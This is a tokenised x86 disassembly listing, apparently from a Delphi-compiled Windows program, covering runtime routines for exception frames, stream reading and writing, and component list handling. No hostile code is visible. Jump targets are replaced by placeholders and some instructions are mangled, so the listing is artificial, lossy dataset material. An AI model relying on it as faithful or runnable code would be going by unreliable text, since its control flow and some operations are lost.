mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4172e4
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405a04
jmp r-xdata
jmp r-xdata
call sub_416dbc
sub_418d34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418d70
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418b44
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d77
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_418d7c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416f7c
test al al
je r-xdata
mov eax [ ebx ]
call sub_418e30
mov eax [ ebx ]
call sub_417ee8
pop ebx
pop ebp
retn
sub_418da4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4172e4
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419228
pop ebx
pop ecx
pop ebp
retn
sub_418dd4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416f7c
test al al
je r-xdata
mov eax [ ebx ]
call sub_4172c0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417ee8
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_419228
jmp r-xdata
mov eax [ ebx ]
call sub_418e30
mov eax [ ebx ]
call sub_416f7c
test al al
je r-xdata
mov eax [ ebx ]
call sub_418fcc
mov eax [ ebx ]
call sub_417ee8
sub_418e30
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418fbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418d20
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418fc6
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
jmp [ eax * 4 + jump_table_418e67 ]
push ebp
call sub_418d7c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_419228
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_419228
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419228
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_419228
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b44
jmp r-xdata
push ebp
mov eax 0x1
call sub_418da4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418d34
jmp r-xdata
push ebp
mov eax 0x1
call sub_418da4
pop ecx
jmp r-xdata
push ebp
call sub_418dd4
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419228
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419228
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419228
jmp r-xdata
push ebp
mov eax 0x2
call sub_418da4
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419228
jmp r-xdata
push ebp
mov eax 0x1
call sub_418da4
pop ecx
sub_418fcc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419009
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418b44
mov eax ebx
call sub_418e30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419010
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_419014
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4190ac
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_416f7c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418b44
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418b44
jmp r-xdata
mov eax ebx
call sub_418fcc
mov eax ebx
call sub_417ee8
jmp r-xdata
mov eax ebx
call sub_416f7c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_419014
mov eax ebx
call sub_417ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4190b3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f0c
retn
sub_4190bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419161
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f80
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419f58
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419168
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
sub_41918c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_4191b4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_417214
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4136b4
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4033c4
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_417214
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_419228
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_4172e4
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_4172e4
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_419270
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419419
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416e48
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4193f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4172e4
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415d74
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_4172e4
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416704
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4193cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418b80
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_4172e4
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415d74
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4172e4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4109f8
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
lea eax [ ebp - 0x1c ]
call sub_405634
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d3e0
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193d6
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub_419438
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419632
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ef54
mov eax [ ebp - 0x4 ]
call sub_4172c0
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
jmp [ eax * 4 + jump_table_41947a ]
mov eax [ ebp - 0x4 ]
call sub_418d20
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e30
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_410230
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e30
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_410230
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e30
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_410230
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c14
mov eax ebx
call sub_4102c0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c58
mov eax ebx
call sub_4102c0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c9c
mov eax ebx
call sub_4102e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417cec
mov eax ebx
call sub_4102d4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b80
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4102fc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_418c3c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_410328
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418d20
cmp al 0x9
sete dl
mov eax ebx
call sub_410298
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_419270
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f27c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e9c
push edx
push eax
mov eax ebx
call sub_41026c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419639
lea eax [ ebp - 0x1c ]
call sub_40ef68
lea eax [ ebp - 0xc ]
call sub_4045c8
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov eax ebx
call sub_410ae0
jmp r-xdata
sub_419640
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41968c
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_4196b8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_419828
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419640
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_419828
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419640
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_419828
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_419640
jmp r-xdata
pop edx
pop ebx
retn
sub_41973c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4042f4
je r-xdata
mov eax esi
call sub_4041a8
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4041a8
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_419828
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419640
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_419640
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_419828
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419640
mov dl 0x6
mov eax ebx
call sub_419828
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419640
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_419640
sub_4197d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419819
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405aa8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41973c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419820
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_4198b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
call sub_419888
mov eax ebx
call sub_419894
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_419a3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419a1f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a26
mov eax [ ebp - 0xc ]
call sub_403198
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_414098
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413f38
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4199e9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4199ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_419a50
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419c08
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_419a9c
push ebx
push esi
push ecx
call sub_403524
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419cf0
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419c98
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_414628
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419c60
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_40350c
lea eax [ ebx + 0x14 ]
call sub_40d3ac
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_414098
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_419b20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4140f4
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413eec
mov edx ebx
mov eax esi
call sub_419b20
sub_419bb4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413eec
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x10 ] eax
sub_419be0
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4141dc
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403198
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419c08
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403394
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_419bb4
mov dl 0x1
mov eax ebx
call sub_41a128
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41a0d8
sub_419c60
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41a128
mov edx ebx
mov eax esi
call sub_419be0
pop edi
pop esi
pop ebx
retn
sub_419c98
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_414180
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419c60
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419be0
sub_419cf0
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_414098
call sub_419cf0
inc edi
dec esi
jne r-xdata
sub_419d2c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4141dc
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403198
xor eax eax
mov [ ebx + 0x14 ] eax
sub_419d50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419d2c
mov edx ebx
mov eax esi
call sub_419d2c
pop esi
pop ebx
retn
sub_419d6c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_419d50
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_414098
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_419dc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419b74
push ebx
push sub_419b9c
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419b88
push ebx
push sub_419ba8
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_419ec0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407d04
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_419f58
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
sub_419f58
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_414098
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407d04
test al al
jne r-xdata
sub_419fa8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4042f4
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407e88
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
xor edx edx
mov eax ebx
call sub_41a128
mov edx esi
mov eax ebx
call sub_41a034
mov dl 0x1
mov eax ebx
call sub_41a128
sub_41a048
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_414098
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413fd4
sub_41a084
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4140f4
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413f38
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_414114
sub_41a0d8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41a074
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41a048
mov cl 0x1
mov edx ebx
call sub_41a0d8
inc edi
dec ebp
jne r-xdata
sub_41a128
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404184
mov edx esp
mov eax esi
call sub_40346c
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41a170
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41a198
push ebx
push esi
